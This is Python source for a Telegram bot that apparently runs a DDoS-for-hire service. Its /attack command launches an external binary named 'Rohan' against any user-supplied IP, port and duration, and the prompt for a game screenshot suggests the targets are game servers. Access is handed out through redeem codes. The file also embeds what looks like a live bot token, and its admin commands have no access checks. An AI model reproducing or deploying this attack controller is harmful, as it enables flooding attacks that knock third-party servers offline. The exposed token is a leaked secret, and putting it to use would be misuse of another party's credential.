import time
import subprocess
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Updater, CommandHandler, MessageHandler, filters, CallbackContext

# Bot Configuration
BOT_TOKEN = "7898888817:AAHfJQUBpUyxj2LS0v6XZ-ufQok262RPJ70"
OWNER_ID = 1866961136  # Replace with your Telegram ID
admins = set([OWNER_ID])
banned_users = {}

# Store redeem codes and group access
redeem_codes = {}

# Start Command
def start(update: Update, context: CallbackContext):
    update.message.reply_text("Welcome! Use /help to see available commands.")

# Help Command
def help_command(update: Update, context: CallbackContext):
    help_text = """
    /start - Start the bot
    /help - Show this help message
    /attack <IP> <PORT> <DURATION> - Start an attack
    /check_access - Check access in group
    /broadcast <message> - Send a message to all users
    /add_admin <user_id> - Add an admin
    /remove_admin <user_id> - Remove an admin
    /generate_code - Generate a redeem code
    /redeem <code> - Redeem a code for access
    /banned_users - List banned users
    /unban <user_id> - Unban a user
    """
    update.message.reply_text(help_text)

# Attack Command
def attack(update: Update, context: CallbackContext):
    if len(context.args) != 3:
        return update.message.reply_text("Usage: /attack <IP> <PORT> <DURATION>")
    
    ip, port, duration = context.args
    user_id = update.effective_user.id

    if user_id in banned_users:
        return update.message.reply_text("❌ You are banned from using this bot.")

    msg = update.message.reply_text(f"🚀 Attack started on {ip}:{port} for {duration}s...")
    start_time = time.time()

    process = subprocess.Popen(["./Rohan", ip, port, duration], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    update.message.reply_text("Please send a screenshot of the game within 2 minutes!")
    context.user_data["awaiting_feedback"] = True

    time.sleep(int(duration))

    elapsed_time = time.time() - start_time
    msg.edit_text(f"✅ Attack finished! Duration: {elapsed_time:.2f} sec")

    if context.user_data.get("awaiting_feedback"):
        banned_users[user_id] = "Failed to send feedback"
        update.message.reply_text("🚨 You are banned for not sending feedback!")
    else:
        update.message.reply_text("✅ Feedback received! Thank you.")

    stdout, stderr = process.communicate()
    if stderr:
        update.message.reply_text(f"⚠️ Error running attack: {stderr.decode()}")

# Feedback Handler
def feedback(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if context.user_data.get("awaiting_feedback"):
        context.user_data["awaiting_feedback"] = False
        update.message.reply_text("✅ Feedback received! Thanks.")
    else:
        update.message.reply_text("⚠️ No feedback was requested.")

# Ban & Unban
def banned_users_list(update: Update, context: CallbackContext):
    if not banned_users:
        return update.message.reply_text("No users are currently banned.")
    
    banned_text = "\n".join([f"{uid} - {reason}" for uid, reason in banned_users.items()])
    update.message.reply_text(f"🚨 Banned Users:\n{banned_text}")

def unban(update: Update, context: CallbackContext):
    if len(context.args) != 1:
        return update.message.reply_text("Usage: /unban <user_id>")
    
    user_id = int(context.args[0])
    if user_id in banned_users:
        del banned_users[user_id]
        update.message.reply_text(f"✅ User {user_id} has been unbanned.")
    else:
        update.message.reply_text("❌ User is not banned.")

# Admin Management
def add_admin(update: Update, context: CallbackContext):
    if len(context.args) != 1:
        return update.message.reply_text("Usage: /add_admin <user_id>")
    
    user_id = int(context.args[0])
    admins.add(user_id)
    update.message.reply_text(f"✅ User {user_id} is now an admin.")

def remove_admin(update: Update, context: CallbackContext):
    if len(context.args) != 1:
        return update.message.reply_text("Usage: /remove_admin <user_id>")
    
    user_id = int(context.args[0])
    if user_id in admins:
        admins.remove(user_id)
        update.message.reply_text(f"✅ User {user_id} has been removed as admin.")
    else:
        update.message.reply_text("❌ User is not an admin.")

# Redeem Code System
def generate_code(update: Update, context: CallbackContext):
    if update.effective_user.id not in admins:
        return update.message.reply_text("❌ Only admins can generate redeem codes.")

    code = f"Rohan-{time.time_ns() % 10000}"
    chat_id = update.effective_chat.id
    redeem_codes[code] = chat_id
    update.message.reply_text(f"✅ Redeem Code: `{code}`\nUse /redeem <code>")

def redeem(update: Update, context: CallbackContext):
    if len(context.args) != 1:
        return update.message.reply_text("Usage: /redeem <code>")

    code = context.args[0]
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    if code in redeem_codes:
        if chat_id < 0:  # Group chat
            update.message.reply_text("✅ This code grants access to all group members!")
        else:  # Private chat
            update.message.reply_text("✅ You now have access!")

        del redeem_codes[code]  # Remove the code after use
    else:
        update.message.reply_text("❌ Invalid redeem code.")

# Main Function
def main():
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("help", help_command))
    dp.add_handler(CommandHandler("attack", attack, pass_args=True))
    dp.add_handler(CommandHandler("check_access", lambda u, c: u.message.reply_text("Checking access...")))
    dp.add_handler(CommandHandler("broadcast", lambda u, c: u.message.reply_text("Broadcasting..."), pass_args=True))
    dp.add_handler(CommandHandler("add_admin", add_admin, pass_args=True))
    dp.add_handler(CommandHandler("remove_admin", remove_admin, pass_args=True))
    dp.add_handler(CommandHandler("generate_code", generate_code))
    dp.add_handler(CommandHandler("redeem", redeem, pass_args=True))
    dp.add_handler(CommandHandler("banned_users", banned_users_list))
    dp.add_handler(CommandHandler("unban", unban, pass_args=True))
    dp.add_handler(MessageHandler(Filters.photo, feedback))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
